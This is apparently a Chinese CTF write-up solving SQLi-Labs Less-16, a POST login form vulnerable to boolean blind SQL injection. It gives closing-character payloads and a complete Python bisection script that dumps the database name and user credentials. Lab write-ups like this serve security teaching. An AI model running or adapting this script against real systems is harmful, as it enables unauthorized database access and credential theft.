【SQLi-Labs】Less-16 POST型双引号盲注与脚本复用 Writeup

操作者：何芊宏 | 操作日期：2026.10.24 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, POST注入, 布尔盲注, Python自动化

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-16 (POST - Blind - Boolian/time Based - Double quotes - String)
  • 提示：POST请求，布尔盲注，双引号+括号闭合

2. 解题思路与前置原理

本关卡为 POST 登录框，无报错回显。成功登录返回 flag.jpg，失败返回无图或其它标识。核心考点在于闭合符的探测与盲注脚本的复用。

通过 Burp 测试单引号 ' 和双引号 " 均无法成功闭合，最终测试出 ") 可以完美闭合，推断后台语句为 username=("$uname")。随后复用 L15 的二分法脚本，仅修改 URL 与闭合符即可。

3. 操作步骤与解析

第一步：Burp 抓包测试闭合符

在 Repeater 中发送不同闭合符的请求：

  • 输入 uname=admin' #&passwd=123&submit=Submit，页面失败。
  • 输入 uname=admin" #&passwd=123&submit=Submit，页面失败。
  • 输入 uname=admin") #&passwd=123&submit=Submit，页面成功，弹出 SUCCESSFUL。

确认闭合方式为 ")。

第二步：验证布尔盲注逻辑

构造真/假条件进行验证：

  • uname=admin") AND 1=1 #&passwd=123&submit=Submit （成功）
  • uname=admin") AND 1=2 #&passwd=123&submit=Submit （失败）

第三步：修改 Python 盲注脚本

复用 L15 的二分法脚本，修改两处代码：

  1. 修改 url 为 Less-16 的地址。
  2. 修改 is_true 函数中的 Payload 构造。此处必须使用外层单引号包裹 f-string，内层使用双引号加括号 ")。
import requests

url = "http://localhost/sqli-labs-master/Less-16/"
success_mark = "flag.jpg"

def is_true(cond):
    # 重点：Python 字符串拼接防止引号冲突
    data = {
        "uname": f'admin") AND ({cond}) #', 
        "passwd": "123456",
        "submit": "Submit",
    }
    try:
        response = requests.post(url, data=data, timeout=5)
        return success_mark in response.text
    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return False

def bisect(expr, low, high):
    while low <= high:
        mid = (low + high) // 2
        if is_true(f"{expr}>{mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return low

def extract(sql):
    n = bisect(f"length(({sql}))", 0, 100)
    if n == 0:
        return ""
        
    result = ""
    for i in range(1, n + 1):
        ascii_code = bisect(f"ascii(substr(({sql}),{i},1))", 32, 126)
        if ascii_code == 0 or ascii_code > 126:
            break
        char = chr(ascii_code)
        result += char
        print(f"[+] 发现第 {i}/{n} 个字符: {char}，当前结果: {result}")
    return result

def main():
    print("[*] 开始 POST 布尔盲注 (Less-16)...")
    db_name = extract("select database()")
    print(f"[*] 数据库名提取完成: {db_name}")
    
    users_data = extract("select group_concat(username,0x3a,password) from security.users")
    print(f"\n[*] 账号密码提取完成:\n{users_data}")

if __name__ == "__main__":
    main()

代码成分解析：

  • data 字典：将闭合符 ")、逻辑判断条件以及注释符 # 组合发送。
  • success_mark = "flag.jpg"：基于底层源码特征进行判定，避免前端渲染导致的误判。
  • 引号嵌套坑：f'admin") AND ({cond}) #'。若外层使用双引号，会导致 Python 语法错误，因此外层必须使用单引号。

第四步：执行结果

运行脚本，终端成功打印出库名 security，随后吐出大量账号密码：Dumb:Dumb,Angelina:I-kill-you...superman:genious,batman:m。受限于长度，部分长密码被截断，但证明漏洞利用完全成功。

4. 踩坑记录与复盘

  • 闭合符探测：盲注没有报错信息，必须通过尝试 '、"、')、") 逐步确定。
  • 引号嵌套问题：Python 中拼接含有双引号的 SQL 语句时，外层 f-string 必须改用单引号，否则会引发 SyntaxError。
  • 长短数据截断：当提取的数据极长时，可能由于 group_concat 的默认长度限制或脚本内的界限设置导致截断，实战中可通过调整 group_concat_max_len 或分批次提取解决。

5. 知识点总结

  • 盲注脚本的高复用性：面对不同关卡，只需调整 url、data 结构、闭合符和 success_mark 即可快速打通。
  • 底层判定：使用文件后缀名（如 flag.jpg）作为判定特征，比依赖前端渲染文字更准确。
